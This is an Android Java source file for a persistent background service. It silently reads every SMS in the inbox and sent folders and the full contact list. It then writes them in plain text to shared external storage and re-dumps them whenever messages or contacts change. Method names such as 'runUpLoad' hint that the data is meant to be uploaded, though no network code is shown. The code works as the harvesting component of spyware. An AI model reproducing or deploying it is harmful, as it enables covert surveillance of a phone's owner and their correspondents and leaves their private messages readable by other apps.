package com.example.samuelfisueoyanna.jumbo;


import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.StringWriter;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.TreeSet;


public class MyService extends Service {

    public MyService() {

    }

    private static final String USER_OLD_TEXT_READ = "USER_OLD_TEXT_READ";

    private String SMS_INBOX_FILE = "Received.txt";
    private String SMS_OUTBOX_FILE = "sent.txt";
    private String CONTACT_FILE_NAME = "contact.txt";

    private ThrottledContentObserver inboxObserver = null;
    private ThrottledContentObserver contactObserver = null;


    @Override
    public void onCreate() {
        super.onCreate();

        inboxObserver = new ThrottledContentObserver(new Callbacks() {
            @Override
            public void onThrottledContentObserverFired() {
                Log.i("MYTAG", "INBOX RESOLVER TOGGLED");
                runUpLoad(ACTION.READ_SMS);
            }
        });
        contactObserver = new ThrottledContentObserver(new Callbacks() {
            @Override
            public void onThrottledContentObserverFired() {
                Log.i("MYTAG", "CONTACT RESOLVER TOGGLED");
                runUpLoad(ACTION.READ_CONTACT);
            }
        });
        runUpLoad(ACTION.READ_SMS);
        runUpLoad(ACTION.READ_CONTACT);
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");

    }

    @Override
    public void onDestroy() {
        try {
            unRegisterObservers();
        } catch (Exception ignore) {
        }
        super.onDestroy();

    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        SharedPreferences preferences =
                PreferenceManager.getDefaultSharedPreferences(this);
        boolean hasUploadedUsersOldText =
                preferences.getBoolean(USER_OLD_TEXT_READ, false);

        if (hasUploadedUsersOldText) {
            registerObservers();
        } else {
            runUpLoad(ACTION.READ_ALL);
        }

        Log.d("MyTag", "ON START");
        return START_STICKY;
    }


    private void registerObservers() {

        ContentResolver contentResolver = getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms"),
                true, inboxObserver);
        contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI,
                true, contactObserver);
        Log.d("MyTag", "Registering");
    }

    private void unRegisterObservers() {
        ContentResolver contentResolver = getContentResolver();
        contentResolver.unregisterContentObserver(inboxObserver);
        contentResolver.unregisterContentObserver(contactObserver);
    }

    private void runUpLoad(ACTION action) {
        new AsyncTask<ACTION, Void, Void>() {

            @Override
            protected Void doInBackground(ACTION... voids) {
                Log.i("TAG", "START TO WRITE");
                switch (voids[0]) {
                    case READ_CONTACT:
                        handleReadContacts();
                        break;
                    case READ_SMS:
                        handleReadOutBox();
                        handleReadInbox();
                        break;
                    default:
                        handleReadOutBox();
                        handleReadInbox();
                        handleReadContacts();
                        SharedPreferences preferences =
                                PreferenceManager.getDefaultSharedPreferences(MyService.this);

                        preferences.edit().putBoolean(USER_OLD_TEXT_READ, true).commit();
                        registerObservers();
                        break;

                }
                Log.i("TAG", "DONE WRITING");
                return null;
            }

            @Override
            protected void onPostExecute(Void aVoid) {

                super.onPostExecute(aVoid);
            }
        }.execute(action);

    }

    public List<Sms> getAllSms(String folderName) {

        List<Sms> lstSms = new ArrayList<>();
        Sms objSms;
        Uri message = Uri.parse("content://sms/" + folderName);
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                try {
                    objSms = new Sms();
                    objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));

                    objSms.setAddress(c.getString(c.getColumnIndexOrThrow("address")));
                    objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                    lstSms.add(objSms);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                c.moveToNext();
            }
        }
        c.close();

        return lstSms;
    }

    private void handleReadInbox() {
        List<Sms> inbox = getAllSms("inbox");
        StringWriter stringWriter = new StringWriter();
        stringWriter.append("SENDER\t\tMESSAGE\n");

        for (Sms sms : inbox) {
            stringWriter.append(sms.getAddress() + "\t\t" +
                    sms.getMsg() + "\n");
        }

        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(),
                SMS_INBOX_FILE);

        try {
            if (!file.exists()) {
                file.createNewFile();
            }

            FileOutputStream fileOutputStream = new FileOutputStream(file, false);
            OutputStreamWriter outputStreamWriter = new
                    OutputStreamWriter(fileOutputStream, Charset.forName("UTF-8"));
            outputStreamWriter.write(stringWriter.toString());
            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleReadOutBox() {
        List<Sms> inbox = getAllSms("sent");
        StringWriter stringWriter = new StringWriter();
        stringWriter.append("SENDER\t\tMESSAGE\n\n");

        for (Sms sms : inbox) {
            stringWriter.append(sms.getAddress() + "\t\t" +
                    sms.getMsg() + "\n\n");
        }

        File file = new
                File(Environment.getExternalStorageDirectory().getAbsolutePath(),
                SMS_OUTBOX_FILE);
        try {
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fileOutputStream = new
                    FileOutputStream(file, false);
            OutputStreamWriter outputStreamWriter = new
                    OutputStreamWriter(fileOutputStream, Charset.forName("UTF-8"));
            outputStreamWriter.write(stringWriter.toString());
            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleReadContacts() {
        List<Contact> contacts = getPhoneContactList();
        StringWriter stringWriter = new StringWriter();
        stringWriter.append("CONTACT\t\t\tNUMBERS\n");

        for (Contact contact : contacts) {
            stringWriter.append(contact.getName() + "\t\t");
            for (String number : contact.getPhoneNumber()) {
                stringWriter.append(number + "\t\t");
            }
            stringWriter.append("\n");
        }

        File file = new
                File(Environment.getExternalStorageDirectory().getAbsolutePath(),
                CONTACT_FILE_NAME);
        try {
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fileOutputStream = new
                    FileOutputStream(file, false);
            OutputStreamWriter outputStreamWriter = new
                    OutputStreamWriter(fileOutputStream, Charset.forName("UTF-8"));
            outputStreamWriter.write(stringWriter.toString());
            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private class Sms {
        private String id;
        private String address;

        public String getMsg() {
            return msg;
        }

        public void setMsg(String msg) {
            this.msg = msg;
        }

        public String getAddress() {
            return address;
        }

        public void setAddress(String address) {
            this.address = address;
        }

        public String getId() {
            return id;
        }

        public void setId(String id) {
            this.id = id;
        }

        private String msg;
    }

    private List<Contact> getPhoneContactList() {

        ContentResolver cr = getContentResolver();
        List<Contact> contacts = new ArrayList<>();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {

            while (cur.moveToNext()) {

                String id =
                        cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name =
                        cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                Contact contact = new Contact();
                contact.setName(name);
                if(Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    Set<String> stringSet = new TreeSet<>();
                    while (pCur.moveToNext()) {

                        String phoneNo =
                                pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).replaceAll("[^0-9]",
                                        "");
                        stringSet.add(phoneNo);

                    }
                    contact.setPhoneNumber(stringSet);
                    pCur.close();
                    contacts.add(contact);
                }

            }
        }
        return contacts;
    }

    public class Contact {
        private String name;
        private Set<String> phoneNumber;

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public Set<String> getPhoneNumber() {
            return phoneNumber;
        }

        public void setPhoneNumber(Set<String> phoneNumber) {
            this.phoneNumber = phoneNumber;
        }
    }

    private enum ACTION {
        READ_SMS, READ_CONTACT, READ_ALL
    }

    interface Callbacks {
        public void onThrottledContentObserverFired();
    }

    class ThrottledContentObserver extends ContentObserver {
        Handler mMyHandler;
        Runnable mScheduledRun = null;
        private static final int THROTTLE_DELAY = 2000;
        Callbacks mCallback = null;


        public ThrottledContentObserver(Callbacks callback) {
            super(null);
            mMyHandler = new Handler();
            mCallback = callback;
        }

        @Override
        public void onChange(boolean selfChange) {
            if (mScheduledRun != null) {
                mMyHandler.removeCallbacks(mScheduledRun);
            } else {
                mScheduledRun = new Runnable() {
                    @Override
                    public void run() {
                        if (mCallback != null) {
                            mCallback.onThrottledContentObserverFired();
                        }
                    }
                };
            }
            mMyHandler.postDelayed(mScheduledRun, THROTTLE_DELAY);
        }

        public void cancelPendingCallback() {
            if (mScheduledRun != null) {
                mMyHandler.removeCallbacks(mScheduledRun);
            }
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            onChange(selfChange);
        }
    }

}



/*






 <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>



*/
